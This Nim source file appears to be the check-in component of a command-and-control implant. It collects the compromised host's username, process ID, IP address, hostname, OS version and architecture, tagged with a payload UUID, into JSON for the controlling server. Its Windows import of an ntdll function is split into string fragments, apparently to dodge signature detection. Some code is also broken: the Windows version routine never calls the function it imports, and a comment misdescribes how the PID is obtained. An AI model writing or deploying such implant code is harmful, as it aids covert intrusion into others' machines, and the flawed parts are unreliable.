import config
import json
import nativesockets
import os
import strutils


when defined(linux):
    import posix_utils
    import strformat
when defined(windows):
    import winlean
    # https://github.com/nim-lang/Nim/issues/11481
    type
        USHORT = uint16
        WCHAR = distinct int16
        UCHAR = uint8
        NTSTATUS = int32
    type OSVersionInfoExW {.importc: "OSVERSIONINFOEXW", header: "<windows.h>".} = object
        dwOSVersionInfoSize: ULONG
        dwMajorVersion: ULONG
        dwMinorVersion: ULONG
        dwBuildNumber: ULONG
        dwPlatformId: ULONG
        szCSDVersion: array[128, WCHAR]
        wServicePackMajor: USHORT
        wServicePackMinor: USHORT
        wSuiteMask: USHORT
        wProductType: UCHAR
        wReserved: UCHAR

    proc `$`(a: array[128, WCHAR]): string = $cast[WideCString](unsafeAddr a[0])
    proc rtlGetVersion(lpVersionInformation: var OSVersionInfoExW): NTSTATUS {.cdecl, importc: "RtlGet" & "Version", dynlib: "ntd" & "ll." & "dll".}

# https://nim-lang.org/docs/system.html#hostCPU
type 
   CheckIn* = object
      action*: string
      ip*: string
      os*: string
      user*: string
      host*: string
      # domain*: string
      pid*: int
      uuid*: string
      architecture*: string

proc getUser*(): string = 
    when defined(linux):
        let homedir = getHomeDir()
        try:
            result = homedir.split(r"/")[2] 
        except:
            result = if homedir.contains("root"): "root" else: homedir
    when defined(windows):
        result = getHomeDir().split(r"\")[2]
    
proc getPID: int = 
    # Calls GetCurrentProcessId via GetProcAddress and LoadLibraryA
    result = getCurrentProcessId()

proc getIP(host: string): string = 
    result = $(nativesockets.getHostByName(host).addrList)

proc getHostName*(): string = 
    result = nativesockets.getHostname()

proc getVersion: string = 
    when defined(linux):
        let vInfo = uname()
        result = fmt("{vInfo.sysname} {vInfo.nodename} {vInfo.release} {vInfo.version} {vInfo.machine}")
    when defined(windows):
        var versionInfo: OSVersionInfoExW    
        result = "Windows " & $(versionInfo.dwMajorVersion) & " Build " & $(versionInfo.dwBuildNumber)


proc createCheckIn*(curConfig: Config): CheckIn = 
    # Create Checkin to be fed to base
    let hostname = getHostName()
    result = CheckIn(action: "checkin", ip: getIP(hostname), os: getVersion(), user: getUser(), host: hostname, pid: getPID(), uuid: curConfig.PayloadUUID, architecture: hostCPU)


proc checkintojson*(check: var CheckIn): string = 
    result = $(%*check)
